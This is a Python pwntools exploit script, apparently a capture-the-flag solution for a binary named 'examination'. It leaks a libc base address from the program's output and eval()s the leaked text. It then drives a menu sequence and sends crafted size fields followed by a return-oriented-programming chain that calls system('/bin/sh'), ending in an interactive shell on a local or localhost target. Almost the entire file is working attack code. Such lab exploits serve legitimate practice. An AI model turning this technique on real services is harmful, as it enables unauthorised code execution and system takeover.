#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./examination')
libc = elf.libc
# libc = ELF('./libc.so.6')
context.update(
    log_level='debug'
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcud = lambda x: p.recvuntil(x, drop=True)
rcu = lambda x: p.recvuntil(x)
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug([elf.path], c)
    else:
        return elf.process()

c = '''
b* main
c
'''

REMOTE = 'nc localhost 5000'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

def time15():
    sla(b'>> ', b'1')
    sla(b'>> ', b'4')

    

p = start()

sla(b'>> ', b'1')
sla(b'>> ', b'1015')

rcu(b'set to ')
libc.address = hleak(rcu(b' ')) - libc.sym.exit
logi('base libc', libc.address)

for i in range(8):
    time15()

rop = ROP(libc)
rop.raw(rop.find_gadget(['ret'])[0])
rop.system(next(libc.search(b"/bin/sh\x00")))
payload = rop.chain()

sla(b'>> ', b'2')
sla(b'? ', b'8')
sleep(20)
# gdb.attach(p)
sa(b'\n\n', p32(0x1020 + len(payload) - 8) + p32(0x1020 - len(payload) + 8) + b'a'*8)
s(payload)


p.interactive()